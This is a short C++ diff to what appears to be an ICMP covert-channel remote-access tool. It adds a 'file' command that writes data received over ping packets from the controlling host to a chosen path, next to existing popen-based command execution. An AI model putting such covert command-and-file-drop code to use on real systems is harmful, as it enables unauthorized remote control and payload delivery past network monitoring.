@@ -180,6 +180,37 @@ void parse_command(int sockfd, const std::string &dst, uint8_t *buf, size_t size
         send_ping(sockfd, dst, NULL, 0);
 
         pclose(fp);
+    } 
+    else if (split.at(0).compare("file") == 0) {
+        std::cout << "copying to file: " << command << "\n";
+
+        FILE *fp = fopen(command.c_str(), "wb+");
+        if (fp == NULL) {
+            perror("fopen");
+            return;
+        }
+
+        while(1)
+        {
+            uint8_t in[512];
+            std::string src_ip;
+            ssize_t num_bytes = receive_ping(sockfd, src_ip, in, sizeof(in));
+
+            if (dst != src_ip) 
+            {
+                continue;
+            }
+
+            if (num_bytes > 0)
+            {
+                size_t write = fwrite(in, 1, num_bytes, fp);
+            }
+            else
+            {
+                fclose(fp);
+                break;
+            }
+        }
     }
 }
 
